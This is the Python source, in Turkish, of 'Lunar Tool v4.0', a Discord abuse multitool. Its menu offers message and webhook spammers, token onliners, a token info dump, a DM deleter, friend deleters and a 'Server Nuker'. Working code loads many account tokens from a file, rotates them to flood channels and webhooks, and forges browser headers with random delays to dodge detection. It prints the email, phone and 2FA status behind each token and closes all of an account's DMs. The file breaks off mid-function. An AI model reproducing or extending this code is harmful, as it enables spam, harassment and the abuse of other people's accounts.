import os
import time
import sys
import threading
import re
import random
import requests
import json
import asyncio
import discord
import base64
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=False, convert=True, strip=False)

FADE_COLORS = [
    (Fore.CYAN, Fore.LIGHTCYAN_EX), (Fore.BLUE, Fore.LIGHTBLUE_EX),
    (Fore.MAGENTA, Fore.LIGHTMAGENTA_EX), (Fore.RED, Fore.LIGHTRED_EX),
    (Fore.GREEN, Fore.LIGHTGREEN_EX), (Fore.YELLOW, Fore.LIGHTYELLOW_EX)
]
RAINBOW_COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
WHITE = Fore.WHITE
BRIGHT_WHITE = Style.BRIGHT + Fore.WHITE
DIM_WHITE = Style.DIM + Fore.WHITE
DANGER_RED = Style.BRIGHT + Fore.RED
SUCCESS_GREEN = Style.BRIGHT + Fore.GREEN
WARNING_YELLOW = Style.BRIGHT + Fore.YELLOW
RESET = Style.RESET_ALL
stop_animation = threading.Event()

if os.name == 'nt':
    import sys
    import msvcrt
    if hasattr(sys.stdout, 'reconfigure'):
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except:
            pass

current_input_text = ""

def get_discord_headers(token=None, bot_token=False):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
    ]
    user_agent = random.choice(user_agents)
    
    build_number = random.randint(280000, 300000)
    super_props = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "tr-TR",
        "browser_user_agent": user_agent,
        "browser_version": user_agent.split("Chrome/")[1].split(".")[0] if "Chrome/" in user_agent else "120",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": build_number,
        "client_event_source": None
    }
    super_props_encoded = base64.b64encode(json.dumps(super_props, separators=(',', ':')).encode()).decode()
    
    headers = {
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Discord-Locale": "tr",
        "X-Discord-Timezone": "Europe/Istanbul",
        "X-Super-Properties": super_props_encoded,
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-CH-UA": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"'
    }
    
    if token:
        if bot_token:
            headers["Authorization"] = f"Bot {token}"
        else:
            headers["Authorization"] = token
    
    return headers

def safe_request(method, url, token=None, bot_token=False, **kwargs):
    headers = get_discord_headers(token, bot_token)
    if 'headers' in kwargs:
        headers.update(kwargs['headers'])
    kwargs['headers'] = headers
    
    if 'timeout' not in kwargs:
        kwargs['timeout'] = random.uniform(8, 12)
    
    delay = random.uniform(0.05, 0.25)
    time.sleep(delay)
    
    try:
        if method.upper() == 'GET':
            return requests.get(url, **kwargs)
        elif method.upper() == 'POST':
            return requests.post(url, **kwargs)
        elif method.upper() == 'PATCH':
            return requests.patch(url, **kwargs)
        elif method.upper() == 'PUT':
            return requests.put(url, **kwargs)
        elif method.upper() == 'DELETE':
            return requests.delete(url, **kwargs)
    except requests.RequestException as e:
        raise e

def get_visible_length(s):
    text = re.sub(r'\x1b\[[0-9;]*m', '', s)
    return len(text)

def center_text(text, width):
    visible_len = get_visible_length(text)
    if visible_len >= width:
        return text
    padding = max(0, (width - visible_len) // 2)
    return " " * padding + text

def get_terminal_width():
    try:
        width = os.get_terminal_size().columns
        return max(80, min(width, 120))
    except (OSError, AttributeError):
        return 100

def set_title(title):
    if os.name == 'nt': os.system(f'title {title}')
    else: sys.stdout.write(f'\033]2;{title}\007'); sys.stdout.flush()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def custom_input(prompt, color=Fore.CYAN):
    width = 60
    prompt_len = get_visible_length(prompt)
    TL, TR, BL, BR = "╔", "╗", "╚", "╝"
    H, V = "═", "║"
    border_color = Style.BRIGHT + Fore.WHITE
    print(f"\n   {border_color}{TL}{H * (width)}{TR}{RESET}")
    print(f"   {border_color}{V}{RESET} {color}{prompt}{RESET}{' ' * (width - prompt_len - 1)}{border_color}{V}{RESET}")
    print(f"   {border_color}{BL}{H * (width)}{BR}{RESET}")
    sys.stdout.write(f"\033[2A")
    sys.stdout.write(f"\033[{prompt_len + 6}C")
    sys.stdout.flush()
    try:
        user_input = input("")
    except:
        user_input = ""
    sys.stdout.write(f"\033[2B")
    return user_input

def load_tokens():
    token_file = "token.txt"
    if not os.path.exists(token_file):
        with open(token_file, "w", encoding='utf-8') as f:
            f.write("Bu dosyaya her satıra bir tane gelecek şekilde Discord token'larınızı yapıştırın.\n")
        print(f"{Fore.YELLOW}UYARI: '{token_file}' bulunamadı, sizin için oluşturuldu.{RESET}")
        print(f"{DIM_WHITE}Lütfen dosyaya token'larınızı ekleyip özelliği yeniden başlatın.{RESET}")
        return None
    with open(token_file, "r", encoding='utf-8') as f:
        tokens = [line.strip() for line in f.readlines() if line.strip()]
    if not tokens:
        print(f"{DANGER_RED}HATA: '{token_file}' dosyası boş veya içinde geçerli token bulunamadı.{RESET}")
        return None
    print(f"{Fore.GREEN}Başarıyla {len(tokens)} adet token '{token_file}' dosyasından yüklendi.{RESET}\n")
    return tokens

def select_account(tokens, title="--- Lütfen İşlem Yapılacak Hesabı Seçin ---"):
    print(f"{DIM_WHITE}Geçerli token'lar ve kullanıcı adları alınıyor...{RESET}")
    valid_accounts = []
    for token in tokens:
        try:
            res = safe_request('GET', "https://discord.com/api/v9/users/@me", token=token)
            if res.status_code == 200:
                user_data = res.json()
                discriminator = user_data.get('discriminator', '0')
                if discriminator and discriminator != '0':
                    username = f"{user_data['username']}#{discriminator}"
                else:
                    username = user_data['username']
                valid_accounts.append({'token': token, 'username': username})
                print(f"{Fore.GREEN} › Bulundu: {WHITE}{username}{RESET}")
            else:
                print(f"{DANGER_RED} › Geçersiz Token: ...{token[-4:]}{RESET}")
        except requests.RequestException:
            print(f"{DANGER_RED} › Ağ Hatası: ...{token[-4:]}{RESET}")
        time.sleep(0.5)
    if not valid_accounts:
        print(f"\n{DANGER_RED}Hiç geçerli hesap bulunamadı.{RESET}")
        return None
    print(f"\n{Fore.CYAN}{title}{RESET}")
    for i, acc in enumerate(valid_accounts):
        print(f"  {BRIGHT_WHITE}{i+1}{RESET} - {acc['username']}")
    try:
        choice = int(custom_input("Seçiminiz (sayı):"))
        if not (1 <= choice <= len(valid_accounts)): raise ValueError
        return valid_accounts[choice - 1]
    except (ValueError, IndexError):
        print(f"\n{DANGER_RED}Geçersiz seçim. Menüye dönülüyor...{RESET}"); time.sleep(2); return None

def select_multiple_accounts(tokens):
    print(f"{DIM_WHITE}Geçerli token'lar ve kullanıcı adları alınıyor...{RESET}")
    valid_accounts = []
    for token in tokens:
        try:
            res = safe_request('GET', "https://discord.com/api/v9/users/@me", token=token)
            if res.status_code == 200:
                user_data = res.json()
                discriminator = user_data.get('discriminator', '0')
                if discriminator and discriminator != '0':
                    username = f"{user_data['username']}#{discriminator}"
                else:
                    username = user_data['username']
                valid_accounts.append({'token': token, 'username': username})
                print(f"{Fore.GREEN} › Bulundu: {WHITE}{username}{RESET}")
        except requests.RequestException: pass
    if not valid_accounts: print(f"\n{DANGER_RED}Hiç geçerli hesap bulunamadı.{RESET}"); return None
    print(f"\n{Fore.CYAN}--- Lütfen İşlem Yapılacak Hesapları Seçin ---{RESET}")
    for i, acc in enumerate(valid_accounts):
        print(f"  {BRIGHT_WHITE}{i+1}{RESET} - {acc['username']}")
    try:
        choice_str = custom_input("Seçiminiz (örn: 1,3,5 veya all):").lower()
        if choice_str == 'all': return valid_accounts
        selected_indices = [int(i.strip()) - 1 for i in choice_str.split(',')]
        selected_accounts = [valid_accounts[i] for i in selected_indices if 0 <= i < len(valid_accounts)]
        if not selected_accounts: raise ValueError
        return selected_accounts
    except (ValueError, IndexError):
        print(f"\n{DANGER_RED}Geçersiz seçim. Menüye dönülüyor...{RESET}"); time.sleep(2); return None

LUNAR_ART = r"""
██╗     ██╗   ██╗███╗   ██╗ █████╗ ██████╗ 
██║     ██║   ██║████╗  ██║██╔══██╗██╔══██╗
██║     ██║   ██║██╔██╗ ██║███████║██████╔╝
██║     ██║   ██║██║╚██╗██║██╔══██║██╔══██╗
███████╗╚██████╔╝██║ ╚████║██║  ██║██║  ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝
"""
def typewriter_effect(text, color, delay=0.03):
    for char in text: 
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)
    print(RESET)

def rainbow_text(text):
    result = ""
    last_color = None
    for i, char in enumerate(text):
        if char != ' ':
            color = RAINBOW_COLORS[i % len(RAINBOW_COLORS)]
            if color != last_color:
                if last_color is not None:
                    result += Style.RESET_ALL
                result += Style.BRIGHT + color
                last_color = color
            result += char
        else:
            result += char
    if last_color is not None:
        result += Style.RESET_ALL
    return result

def loading_bar(width, color, message="Yükleniyor"):
    total_bar_width = 50
    padding = (width - total_bar_width - len(message) - 10) // 2
    if padding < 0: padding = 0
    bar_chars = ["░", "█"]
    print("\n")
    for i in range(101):
        filled_len = int(total_bar_width * (i / 100))
        empty_len = total_bar_width - filled_len
        filled_bar = ""
        for j in range(filled_len):
            if j < filled_len / 3:
                filled_bar += f"{Fore.CYAN}{bar_chars[1]}"
            elif j < 2 * filled_len / 3:
                filled_bar += f"{Fore.BLUE}{bar_chars[1]}"
            else:
                filled_bar += f"{Fore.MAGENTA}{bar_chars[1]}"
        empty_bar = f"{DIM_WHITE}{bar_chars[0] * empty_len}{RESET}"
        percent = f"{Style.BRIGHT}{Fore.WHITE}{i:3d}%{RESET}"
        if i % 10 < 5:
            msg_colored = f"{color}{message}{RESET}"
        else:
            msg_colored = f"{Style.BRIGHT}{color}{message}{RESET}"
        bar_text = f" {msg_colored} [{filled_bar}{empty_bar}] {percent}"
        sys.stdout.write(f"\r" + " " * padding + bar_text)
        sys.stdout.flush()
        time.sleep(0.015)
    print("\n")

def glitch_text(text_lines, width, color, cycles=10, delay=0.04):
    glitch_chars = "@#$&*%/\\|<>?~`"
    for i in range(cycles):
        glitched_output = ["".join([random.choice(glitch_chars) if random.random() > 0.80 else char for char in line]) for line in text_lines]
        centered_output = [center_text(f"{color}{line}{RESET}", width) for line in glitched_output]
        sys.stdout.write('\033[H' + '\n'.join(centered_output))
        sys.stdout.flush()
        time.sleep(delay)

def pulse_effect(text, colors, cycles=3):
    for _ in range(cycles):
        for color in colors:
            sys.stdout.write(f"\r{color}{text}{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)

def gradient_text(text, start_color, end_color):
    result = ""
    colors = [Fore.CYAN, Fore.LIGHTCYAN_EX, Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.MAGENTA, Fore.LIGHTMAGENTA_EX]
    for i, char in enumerate(text):
        if char != ' ':
            color_idx = int((i / len(text)) * (len(colors) - 1))
            result += f"{colors[color_idx]}{char}{RESET}"
        else:
            result += char
    return result
def run_startup_sequence():
    width = 100
    set_title("Lunar /// Initializing..."); clear_screen()
    print("\n")
    check_steps = [
        "INITIALIZING KERNEL...",
        "LOADING MODULES...",
        "BYPASSING SECURITY...",
        "CONNECTING TO NETWORK...",
        "ESTABLISHING SECURE LINK...",
        "SYSTEM OPTIMIZATION..."
    ]
    for step in check_steps:
        binary = "".join(random.choice(['0', '1']) for _ in range(20))
        step_text = f"{Style.BRIGHT}{Fore.GREEN}[SYSTEM]{RESET} {step:.<30} {Fore.CYAN}[OK]{RESET}" 
        sys.stdout.write(f"\r{' ' * 10}{step_text} {Style.DIM}{binary}{RESET}")
        sys.stdout.flush()
        time.sleep(random.uniform(0.1, 0.3))
        print()
    time.sleep(0.5)
    clear_screen(); print("\n\n")
    logo_lines = LUNAR_ART.splitlines()
    for line in logo_lines:
        print(center_text(f"{Style.BRIGHT}{Fore.MAGENTA}{line}{RESET}", width))
    time.sleep(0.5)
    print("\n")
    loading_bar(width, Fore.CYAN, "SYSTEM INITIALIZATION")
    time.sleep(0.3)
    set_title("Lunar /// Ready")
    clear_screen()
    glitch_text(logo_lines, width, Fore.CYAN, cycles=6, delay=0.03)
    clear_screen()
    for i, line in enumerate(logo_lines):
        if not line.strip():
            print()
            continue
        color = RAINBOW_COLORS[i % len(RAINBOW_COLORS)]
        print(center_text(f"{Style.BRIGHT}{color}{line}{RESET}", width))
    print("\n")
    print(center_text(f"{Style.BRIGHT}{Fore.WHITE}Wait for the connection...{RESET}", width))
    time.sleep(1)

def get_menu_layout(dim_color, bright_color, terminal_width):
    MENU_WIDTH = 96 
    lines = []
    TL, TR, BL, BR = "╔", "╗", "╚", "╝"
    H, V = "═", "║"
    T_DOWN, T_UP = "╦", "╩"
    BORDER_COLOR = bright_color
    TEXT_COLOR = Fore.WHITE
    NUM_COLOR = Fore.CYAN
    left_options = [
        "[1] Message Spammer", "[2] Webhook Spammer", "[3] Webhook Deleter",
        "[4] Webhook Info", "[5] Token Onliner", "[6] Token Info", "[7] Token DM Deleter"
    ]
    right_options = [
        "[8] Token Del Friends", "[9] Token Blk Friends", "[10] GroupName Changer",
        "[11] Group Leaver", "[12] Group Creator", "[13] Server Nuker", "[14] Voice Joiner"
    ]
    lines.append(f"{BORDER_COLOR}{TL}{H * (MENU_WIDTH - 2)}{TR}{RESET}")
    title = " LUNAR TOOL v4.0 "
    title_padding = (MENU_WIDTH - 2 - len(title)) // 2
    lines.append(f"{BORDER_COLOR}{V}{RESET}{' ' * title_padding}{Style.BRIGHT}{Fore.MAGENTA}{title}{RESET}{' ' * (MENU_WIDTH - 2 - title_padding - len(title))}{BORDER_COLOR}{V}{RESET}")
    half_width = (MENU_WIDTH - 3) // 2
    lines.append(f"{BORDER_COLOR}{'╠'}{H * half_width}{T_DOWN}{H * (MENU_WIDTH - 2 - half_width - 1)}{'╣'}{RESET}")
    for i in range(len(left_options)):
        left_txt = left_options[i]
        right_txt = right_options[i] if i < len(right_options) else ""
        l_num_end = left_txt.find("]") + 1
        l_colored = f"{NUM_COLOR}{left_txt[:l_num_end]}{getTextColor(i)}{left_txt[l_num_end:]}{RESET}"
        r_colored = ""
        if right_txt:
            r_num_end = right_txt.find("]") + 1
            if "Nuker" in right_txt:
                r_colored = f"{Fore.RED}{right_txt}{RESET}"
            else:
                r_colored = f"{NUM_COLOR}{right_txt[:r_num_end]}{getTextColor(i+7)}{right_txt[r_num_end:]}{RESET}"
        l_padding = half_width - len(left_txt) - 2
        r_padding = (MENU_WIDTH - 2 - half_width - 1) - len(right_txt) - 2
        line = f"{BORDER_COLOR}{V}{RESET} {l_colored}{' ' * l_padding}{BORDER_COLOR}{V}{RESET} {r_colored}{' ' * r_padding}{BORDER_COLOR}{V}{RESET}"
        lines.append(line)
    lines.append(f"{BORDER_COLOR}{'╠'}{H * half_width}{T_UP}{H * (MENU_WIDTH - 2 - half_width - 1)}{'╣'}{RESET}")
    exit_txt = "[00] Exit / Kapat"
    exit_padding = (MENU_WIDTH - 2 - len(exit_txt)) // 2
    lines.append(f"{BORDER_COLOR}{V}{RESET}{' ' * exit_padding}{Fore.RED}{exit_txt}{RESET}{' ' * (MENU_WIDTH - 2 - exit_padding - len(exit_txt))}{BORDER_COLOR}{V}{RESET}")
    lines.append(f"{BORDER_COLOR}{BL}{H * (MENU_WIDTH - 2)}{BR}{RESET}")
    return lines

def getTextColor(index):
    if index % 2 == 0: return Fore.LIGHTWHITE_EX
    return Fore.WHITE

def animate_menu():
    color_index = 0
    frame = 0
    while not stop_animation.is_set():
        term_width = get_terminal_width()
        dim_color, bright_color = FADE_COLORS[color_index]
        logo_lines = []
        for i, line in enumerate(LUNAR_ART.splitlines()):
            if line.strip():
                rainbow_idx = (i + frame) % len(RAINBOW_COLORS)
                color = RAINBOW_COLORS[rainbow_idx]
                logo_lines.append(center_text(f"{color}{line}{RESET}", term_width))
            else:
                logo_lines.append("")
        menu_lines = get_menu_layout(dim_color, bright_color, term_width)
        final_output = ["\033[H"] 
        final_output.extend(logo_lines)
        final_output.append("")
        for line in menu_lines:
            plain = re.sub(r'\x1b\[[0-9;]*m', '', line)
            padding = (term_width - len(plain)) // 2
            if padding < 0: padding = 0
            final_output.append(" " * padding + line)
        prompt_box_width = 30
        p_padding = (term_width - prompt_box_width) // 2
        final_output.append("")
        final_output.append(" " * p_padding + f"{bright_color}╔════════ COMMAND ════════╗{RESET}")
        cursor = "_" if frame % 2 == 0 else " "
        display_text = current_input_text + cursor
        if len(display_text) > 20: 
            display_text = "..." + display_text[-17:]
        final_output.append(" " * p_padding + f"{bright_color}║{RESET}  {Style.BRIGHT}{Fore.WHITE}{display_text.ljust(20)}{RESET}   {bright_color}║{RESET}")
        final_output.append(" " * p_padding + f"{bright_color}╚═════════════════════════╝{RESET}")
        sys.stdout.write('\n'.join(final_output))
        sys.stdout.flush()
        color_index = (color_index + 1) % len(FADE_COLORS)
        frame += 1
        time.sleep(0.3)

def message_spammer():
    set_title("Lunar /// Message Spammer"); clear_screen()
    print(f"\n{SUCCESS_GREEN}{'=' * 60}{RESET}")
    print(center_text(f"{BRIGHT_WHITE}MESSAGE SPAMMER{RESET}", 60))
    print(f"{SUCCESS_GREEN}{'=' * 60}{RESET}\n")
    tokens = load_tokens()
    if tokens is None: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    try:
        channel_id = custom_input("Kanal / DM / Grup ID'sini girin:")
        message = custom_input("Gönderilecek Mesaj:")
        delay = float(custom_input("Gecikme (saniye, örn: 0.5):"))
    except (ValueError, KeyboardInterrupt, EOFError): print(f"\n{DANGER_RED}Geçersiz giriş veya işlem iptali.{RESET}"); time.sleep(2); return
    stop_event = threading.Event()
    def worker():
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"; payload = {"content": message, "tts": False}
        while not stop_event.is_set():
            try:
                token = random.choice(tokens)
                response = safe_request('POST', url, token=token, json=payload)
                if response.status_code == 200: 
                    spinner = ["✓", "✔", "✅"][random.randint(0, 2)]
                    print(f"{SUCCESS_GREEN}{spinner} Mesaj gönderildi{RESET} {DIM_WHITE}(Token: ...{token[-4:]}){RESET}")
                elif response.status_code == 429:
                    retry_after = response.json().get('retry_after', 1)
                    print(f"{Fore.YELLOW}Rate limit! {retry_after:.2f}s bekleniyor... (Token: ...{token[-4:]}){RESET}")
                    time.sleep(retry_after)
                else: print(f"{DANGER_RED}Hata: {response.status_code} (Token: ...{token[-4:]}){RESET}")
                time.sleep(delay)
            except requests.RequestException: print(f"{DANGER_RED}Ağ Hatası.{RESET}"); time.sleep(5)
    worker_thread = threading.Thread(target=worker, daemon=True); worker_thread.start()
    print(f"\n{Fore.YELLOW}Spam döngüsü başlatıldı. Durdurmak için Enter'a basın...{RESET}")
    try: input()
    except (KeyboardInterrupt, EOFError): pass
    print(f"\n{DANGER_RED}İşlem durduruluyor...{RESET}"); stop_event.set(); time.sleep(1)
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def webhook_spammer():
    set_title("Lunar /// Webhook Spammer"); clear_screen()
    print(f"\n{Fore.CYAN}{'=' * 60}{RESET}")
    print(center_text(f"{BRIGHT_WHITE}WEBHOOK SPAMMER{RESET}", 60))
    print(f"{Fore.CYAN}{'=' * 60}{RESET}\n")
    try:
        webhook_url = custom_input("Webhook URL'sini girin:")
        message = custom_input("Gönderilecek Mesaj:")
        username = custom_input("Görünecek Kullanıcı Adı (opsiyonel):")
        amount = int(custom_input("Mesaj Sayısı (kaç adet):"))
        delay = float(custom_input("Gecikme (saniye, örn: 0.5):"))
    except (ValueError, KeyboardInterrupt, EOFError): print(f"\n{DANGER_RED}Geçersiz giriş veya işlem iptali.{RESET}"); time.sleep(2); return
    payload = {'content': message}; print(f"\n{Fore.YELLOW}>>> Spam işlemi başlatılıyor... <<<{RESET}\n")
    if username: payload['username'] = username
    successful_sends = 0
    for i in range(amount):
        try:
            response = requests.post(webhook_url, json=payload, timeout=5)
            if 200 <= response.status_code < 300: 
                successful_sends += 1
                progress = int((i+1) / amount * 100)
                bar = "█" * (progress // 2) + "░" * (50 - progress // 2)
                print(f"{SUCCESS_GREEN}✓ [{i+1}/{amount}] {Fore.CYAN}[{bar}] {progress}%{RESET}")
            else: print(f"{DANGER_RED}[{i+1}/{amount}] Hata: {response.status_code}{RESET}")
            time.sleep(delay)
        except (requests.RequestException, KeyboardInterrupt, EOFError): print(f"\n{DANGER_RED}İşlem durduruldu.{RESET}"); break
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def webhook_deleter():
    set_title("Lunar /// Webhook Deleter"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Webhook Deleter <<< {RESET}")
    try:
        webhook_url = custom_input("Silinecek Webhook URL'sini girin:")
        confirm = custom_input("Emin misiniz? ('evet' yazın):", color=Fore.RED).lower()
        if confirm != 'evet': print(f"\n{Fore.YELLOW}İşlem iptal edildi.{RESET}"); time.sleep(2); return
    except (KeyboardInterrupt, EOFError): return
    try:
        response = requests.delete(webhook_url, timeout=5)
        if response.status_code == 204: print(f"{Fore.GREEN}BAŞARILI: Webhook kalıcı olarak silindi.{RESET}")
        elif response.status_code == 404: print(f"{Fore.YELLOW}BİLGİ: Bu webhook zaten silinmiş veya geçersiz.{RESET}")
        else: print(f"{DANGER_RED}HATA: Webhook silinemedi. Status: {response.status_code}{RESET}")
    except requests.RequestException as e: print(f"{DANGER_RED}HATA: Bir ağ hatası oluştu: {e}{RESET}")
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def webhook_info():
    set_title("Lunar /// Webhook Info"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Webhook Info <<< {RESET}\n")
    try:
        webhook_url = custom_input("Webhook URL'sini girin:")
        bot_token = custom_input("Bot Token (Opsiyonel):")
    except (KeyboardInterrupt, EOFError): return
    guild_id = None
    try:
        response = requests.get(webhook_url, timeout=5)
        print(f"\n{Fore.GREEN}--- Temel Webhook Bilgileri ---{RESET}")
        if response.status_code == 200:
            data = response.json(); guild_id = data.get('guild_id')
            print(f"{Fore.CYAN} Adı: {WHITE}{data.get('name')}{RESET} | {Fore.CYAN}Sunucu ID: {WHITE}{guild_id}{RESET} | {Fore.CYAN}Kanal ID: {WHITE}{data.get('channel_id')}{RESET}")
        else: print(f"{DANGER_RED}HATA: Webhook bilgileri alınamadı. Status: {response.status_code}{RESET}"); input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    except requests.RequestException as e: print(f"{DANGER_RED}HATA: Bir ağ hatası oluştu: {e}{RESET}"); input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    if bot_token and guild_id:
        try:
            r_roles = safe_request('GET', f"https://discord.com/api/v9/guilds/{guild_id}/roles", token=bot_token, bot_token=True)
            print(f"\n{Fore.GREEN}--- Sunucu Rolleri ---{RESET}")
            if r_roles.status_code == 200: print(', '.join([f"{WHITE}@{role['name']}{RESET}" for role in r_roles.json() if role['name'] != '@everyone']))
            else: print(f"{DANGER_RED}HATA: Roller alınamadı. Status: {r_roles.status_code}{RESET}")
        except requests.RequestException: print(f"{DANGER_RED}HATA: Roller çekilirken ağ hatası.{RESET}")
        try:
            r_channels = safe_request('GET', f"https://discord.com/api/v9/guilds/{guild_id}/channels", token=bot_token, bot_token=True)
            print(f"\n{Fore.GREEN}--- Sunucu Kanalları ---{RESET}")
            if r_channels.status_code == 200: print(', '.join([f"{WHITE}#{channel['name']}{RESET}" for channel in r_channels.json() if channel['type'] == 0]))
            else: print(f"{DANGER_RED}HATA: Kanallar alınamadı. Status: {r_channels.status_code}{RESET}")
        except requests.RequestException: print(f"{DANGER_RED}HATA: Kanallar çekilirken ağ hatası.{RESET}")
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def keep_token_alive(token, stop_event):
    payload = {"custom_status": {"text": "Lunar Tool 🌙", "emoji_name": "🌙"}}
    while not stop_event.is_set():
        try:
            r = safe_request('PATCH', "https://discord.com/api/v9/users/@me/settings", token=token, json=payload)
            if r.status_code != 200: break
        except requests.RequestException: break
        time.sleep(30)
def token_onliner():
    set_title("Lunar /// Token Onliner"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Token Onliner <<< {RESET}")
    tokens = load_tokens()
    if tokens is None: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    stop_onliner_event = threading.Event()
    for token in tokens: threading.Thread(target=keep_token_alive, args=(token, stop_onliner_event), daemon=True).start()
    print(f"{Fore.GREEN}{len(tokens)} adet token için online tutma işlemi başlatıldı...{RESET}")
    print(f"{Fore.YELLOW}Durdurmak için Enter'a basın.{RESET}")
    try: input()
    except (KeyboardInterrupt, EOFError): pass
    print(f"\n{DANGER_RED}İşlem durduruluyor...{RESET}"); stop_onliner_event.set(); time.sleep(1)
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def token_info():
    set_title("Lunar /// Token Info"); clear_screen()
    print(f"\n{Fore.MAGENTA}{'=' * 60}{RESET}")
    print(center_text(f"{BRIGHT_WHITE}TOKEN INFO{RESET}", 60))
    print(f"{Fore.MAGENTA}{'=' * 60}{RESET}\n")
    tokens = load_tokens()
    if tokens is None: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    nitro_map = {0: "Nitro Yok", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
    for token in tokens:
        try:
            response = safe_request('GET', "https://discord.com/api/v9/users/@me", token=token)
            print(f"{BRIGHT_WHITE}--- Token Sonu ...{token[-4:]} ---{RESET}")
            if response.status_code == 200:
                data = response.json()
                discriminator = data.get('discriminator', '0')
                if discriminator and discriminator != '0':
                    username_display = f"{data['username']}#{discriminator}"
                else:
                    username_display = data['username']
                print(f"{Fore.CYAN} Kullanıcı: {WHITE}{username_display} {Fore.CYAN}ID: {WHITE}{data['id']}{RESET}")
                print(f"{Fore.CYAN} E-posta: {WHITE}{data.get('email') or 'Yok'} | {Fore.CYAN}Telefon: {WHITE}{data.get('phone') or 'Yok'}{RESET}")
                print(f"{Fore.CYAN} 2FA: {Fore.GREEN if data.get('mfa_enabled') else Fore.RED}{data.get('mfa_enabled')} | {Fore.CYAN}Nitro: {WHITE}{nitro_map.get(data.get('premium_type'), 'Bilinmiyor')}{RESET}")
            else: print(f"{DANGER_RED} Hata: Token geçersiz. Status: {response.status_code}{RESET}")
        except requests.RequestException as e: print(f"{DANGER_RED} Hata: Ağ hatası: {e}{RESET}")
        print(""); time.sleep(1)
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def token_dm_deleter():
    set_title("Lunar /// Token DM Deleter"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Token DM Deleter <<< {RESET}")
    tokens = load_tokens();
    if not tokens: input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}"); return
    selected_account = select_account(tokens)
    if not selected_account: return
    try:
        print(f"\n{DANGER_RED}Seçilen Hesap: {WHITE}{selected_account['username']}{RESET}")
        confirm = custom_input("TÜM DM'leri kapatmak için 'evet':", color=Fore.RED).lower()
        if confirm != 'evet': print(f"\n{Fore.YELLOW}İşlem iptal edildi.{RESET}"); time.sleep(2); return
    except (KeyboardInterrupt, EOFError): return
    token = selected_account['token']
    print(f"\n{BRIGHT_WHITE}--- {selected_account['username']} için işlem başlatıldı ---{RESET}")
    try:
        response = safe_request('GET', "https://discord.com/api/v9/users/@me/channels", token=token)
        if response.status_code == 200:
            channels = [ch for ch in response.json() if ch['type'] in [1, 3]]
            if not channels: print(f"{Fore.GREEN}Kapatılacak DM kanalı bulunamadı.{RESET}")
            else:
                print(f"{Fore.YELLOW}{len(channels)} adet DM kanalı kapatılacak...{RESET}")
                for i, channel in enumerate(channels):
                    recipients = [u.get('username', 'Bilinmeyen') for u in channel.get('recipients', [])]
                    print(f"{DIM_WHITE} › [{i+1}/{len(channels)}] Kanal kapatılıyor: ({', '.join(recipients)}){RESET}")
                    safe_request('DELETE', f"https://discord.com/api/v9/channels/{channel['id']}", token=token); time.sleep(0.8)
                print(f"{Fore.GREEN}\nBaşarıyla tüm DM'ler kapatıldı.{RESET}")
        else: print(f"{DANGER_RED}DM kanalları alınamadı.{RESET}")
    except requests.RequestException as e: print(f"{DANGER_RED}Ağ hatası: {e}{RESET}")
    input(f"\n{DIM_WHITE}Ana menüye dönmek için Enter'a basın...{RESET}")

def token_delete_friends():
    set_title("Lunar /// Delete Friends"); clear_screen(); print(f"\n{BRIGHT_WHITE}>>> Arkadaş Silme <<< {RESET}")
    tokens = load_tokens();
